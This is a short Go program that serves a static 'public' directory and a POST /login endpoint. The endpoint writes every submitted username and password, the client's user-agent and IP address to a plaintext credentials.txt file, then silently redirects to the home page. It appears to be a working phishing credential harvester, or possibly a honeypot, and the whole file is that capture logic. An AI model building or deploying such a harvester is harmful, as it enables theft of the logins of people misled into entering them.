package main

import (
	"github.com/go-chi/chi/v5"
	"log"
	"log/slog"
	"net/http"
	"os"
)

func main() {
	logFile, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer func() { _ = logFile.Close() }()

	logger := slog.New(slog.NewTextHandler(logFile, nil))
	slog.SetDefault(logger)

	r := chi.NewRouter()
	r.Post("/login", login)
	r.Handle("/", http.FileServer(http.Dir("public")))

	log.Fatal(http.ListenAndServe(":8080", r))
}

func login(writer http.ResponseWriter, req *http.Request) {
	slog.Info(
		"Login Attempt",
		slog.String("username", req.FormValue("_user")),
		slog.String("password", req.FormValue("_pass")),
		slog.String("user-agent", req.UserAgent()),
		slog.String("ip", req.RemoteAddr),
	)
	http.Redirect(writer, req, "/", 302)
}
